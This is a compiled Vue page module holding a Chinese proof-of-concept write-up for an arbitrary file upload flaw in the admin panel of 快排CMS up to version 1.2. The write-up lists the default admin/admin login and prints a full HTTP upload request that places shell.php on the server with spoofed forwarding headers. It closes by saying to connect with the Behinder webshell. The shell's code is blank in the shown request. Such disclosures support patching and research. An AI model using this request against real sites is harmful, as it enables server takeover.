import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o as d,c as t,a as i,b as s,d as r,e}from"./app-58e4a7d6.js";const c={},o=e(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>快排CMS 后台管理模块存在任意文件上传漏洞，攻击者通过漏洞可以控制服务器</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>快排 CMS &lt;= 1.2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2>`,5),p={href:"https://gitee.com/qingzhanwang/kpcms",target:"_blank",rel:"noopener noreferrer"},m=e(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面如下, 默认账号密码为 <strong>admin/admin</strong></p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://xxx.xxx.xxx.xxx/admin.php/index/login.html
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202170921790.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>源码中没有对上传文件的后缀检测</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>thinkphp/library/think/File.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202170922307.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>任意找一处文件上传点</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202170922296.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>上传抓包获取文件地址</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202170922533.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>POST /admin.php/index/upload.html?dir=image HTTP/1.1
Host: 192.168.1.108:88
Content-Length: 935
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.1.108:88
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYIt9WaQZiDMrwAVm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/avif,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/webp,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.1.108:88/admin.php/config/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: admin_id=IphHb2Z%2FRG9gIXGA7HpPzQ%3D%3D; menu_show=0; menu_id=menu_22; url=%2Fadmin.php%2Fconfig%2Findex.html
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close

------WebKitFormBoundaryYIt9WaQZiDMrwAVm
Content-Disposition: form-data; name=&quot;localUrl&quot;

C:\\fakepath\\shell.php
------WebKitFormBoundaryYIt9WaQZiDMrwAVm
Content-Disposition: form-data; name=&quot;imgFile&quot;; filename=&quot;shell.php&quot;
Content-Type: application/octet-stream

&lt;?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
?&gt;

------WebKitFormBoundaryYIt9WaQZiDMrwAVm--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>连接冰蝎木马即可</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202170922800.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14);function u(v,g){const n=l("ExternalLinkIcon");return d(),t("div",null,[o,i("p",null,[i("a",p,[s("https://gitee.com/qingzhanwang/kpcms"),r(n)])]),m])}const x=a(c,[["render",u],["__file","快排CMS 后台任意文件上传漏洞.html.vue"]]);export{x as default};
